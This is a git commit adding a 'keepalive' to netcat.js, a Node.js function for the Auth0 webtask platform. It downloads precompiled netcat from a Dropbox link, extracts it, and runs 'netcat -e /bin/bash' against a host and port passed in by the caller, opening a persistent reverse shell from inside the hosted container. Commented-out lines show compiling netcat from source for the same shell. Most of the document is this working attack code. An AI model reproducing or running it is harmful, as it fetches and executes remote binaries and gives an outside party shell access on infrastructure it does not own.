56060f0343b2b23a0b7627646e90aed050a904d1
Mark Bassett <mark.wil.bassett@hp.com>
2016-01-15 01:27:41 -0800

    keepalive for netcat
    added keep alive script for netcat
    (can be easily modified for other webtasks)

--- netcat.js
+++ netcat.js
@@ -1,34 +1,60 @@
 var execsync = require('child_process').execSync;
+var exec = require('child_process').exec;
+var fs = require('fs');
 
 // download netcat and initiate reverse shell
 // edit final command to point at appropriate ip address hosting a listening netcat port
 // launch listening port with netcat -l portnum
 
-// shell lasts until the web box is restarted, so not very long, but fun anyway =)
-// until i can figure out how to make keep_open work or bypass the container reaping it is only a novelty
+// run companion keep_alive.py script to both initiate the netcat & container and keep the connection up and running
 
+
+var exists = false;
+var webtaskurl = 'https://webtask.it.auth0.com/api/run/wt-mbassett_jr-gmail_com-0/netcat?webtask_no_cache=1&keepalive=YESPLZ';
+
+function file_exist(path) {
+    try {
+       fs.accessSync(path, fs.F_OK);
+       return true;
+    } catch (e) { return false; };
+}
 
 module.exports = function (context, cb) {
     cb(null, 'Connect to logs. ');
-// option 1 compile netcat
-//    cmd = 'wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz -O /tmp/netcat-0.7.1.tar.gz'
-//    execsync(cmd, {stdio:[0,1,2]} );
-//    cmd = 'cd /tmp; tar xzvf netcat-0.7.1.tar.gz'
-//    execsync(cmd, {stdio:[0,1,2]});
-//    cmd = 'cd /tmp/netcat-0.7.1 && ./configure'
-//    execsync(cmd, {stdio:[0,1,2]} );
-//    cmd = 'cd /tmp/netcat-0.7.1 && make'
-//    execsync(cmd, {stdio:[0,1,2]} );
-//    cmd = '/tmp/netcat-0.7.1/src/netcat -e /bin/bash ' + context.data.host + ' ' + context.data.port
 
-// option 2 grab precompiled binaries
-    cmd = 'wget https://www.dropbox.com/s/u0my5zl9lelhiv8/stuff.tar.bz?dl=0 -O /tmp/stuff.tar.bz'
-    execsync(cmd, {stdio:[0,1,2]} );
-    cmd = 'cd /tmp; tar xjvf stuff.tar.bz'
-    execsync(cmd, {stdio:[0,1,2]});
+    // for our container keepalives we want to not launch new netcats
+    try {
+      if (context.data.host)
+          exists = true;
+    } catch (e) { };
 
-    // last command fails if the remote port is unreachable/ not listening
-    cmd = 'cd /tmp && ./netcat -e /bin/bash ' + context.data.host + ' ' + context.data.port;
-    execsync(cmd, {stdio:[0,1,2]} );
-    console.log('Complete');
+    if (exists) {
+        // option 1 compile netcat
+        //    cmd = 'wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz -O /tmp/netcat-0.7.1.tar.gz'
+        //    execsync(cmd, {stdio:[0,1,2]} );
+        //    cmd = 'cd /tmp; tar xzvf netcat-0.7.1.tar.gz'
+        //    execsync(cmd, {stdio:[0,1,2]});
+        //    cmd = 'cd /tmp/netcat-0.7.1 && ./configure'
+        //    execsync(cmd, {stdio:[0,1,2]} );
+        //    cmd = 'cd /tmp/netcat-0.7.1 && make'
+        //    execsync(cmd, {stdio:[0,1,2]} );
+        //    cmd = '/tmp/netcat-0.7.1/src/netcat -e /bin/bash ' + context.data.host + ' ' + context.data.port
+
+        // option 2 grab precompiled binaries
+
+        if (!(file_exist('/data/io/stuff.tar.bz'))) {
+            cmd = 'wget https://www.dropbox.com/s/u0my5zl9lelhiv8/stuff.tar.bz?dl=0 -O /data/io/stuff.tar.bz';
+            execsync(cmd, {stdio:[0,1,2]} );
+        }
+        if (!(file_exist('/data/io/netcat'))) {
+            cmd = 'cd /data/io/; tar xjvf stuff.tar.bz';
+            execsync(cmd, {stdio:[0,1,2]});
+        }
+        // last command fails if the remote port is unreachable/ not listening
+        // launching into the background so we can do it async
+        cmd = 'cd /data/io && ./netcat -e /bin/bash ' + context.data.host + ' ' + context.data.port + ' &';
+        exec(cmd, {stdio:[0,1,2]} );
+        console.log('Complete');
+    }
+
 }
